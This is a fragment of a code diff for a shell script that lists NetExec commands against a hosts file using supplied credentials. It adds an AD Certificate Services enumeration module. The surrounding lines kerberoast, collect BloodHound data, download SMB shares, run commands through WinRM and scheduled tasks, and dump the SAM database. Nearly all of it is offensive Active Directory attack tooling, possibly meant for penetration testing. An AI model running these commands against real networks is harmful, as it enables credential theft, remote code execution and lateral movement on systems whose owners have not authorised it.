@@ -16,6 +16,7 @@ commands=(
     "nxc smb hosts.txt -u \"$user\" -p \"$password\" -M spider_plus -o DOWNLOAD_FLAG=True"
     "nxc ldap hosts.txt -u \"$user\" -p \"$password\" --bloodhound --collection All --dns-server \"$ip\""
     "nxc ldap hosts.txt -u \"$user\" -p \"$password\" --kerberoast output.txt"
+    "nxc ldap hosts.txt -u \"$user\" -p \"$password\" -M adcs"
     "nxc winrm hosts.txt -u \"$user\" -p \"$password\" -X 'whoami'"
     "nxc smb hosts.txt -u \"$user\" -p \"$password\" -M schtask_as -o User=\"$user\" CMD=whoami"
     "nxc smb hosts.txt -u \"$user\" -p \"$password\" --sam"
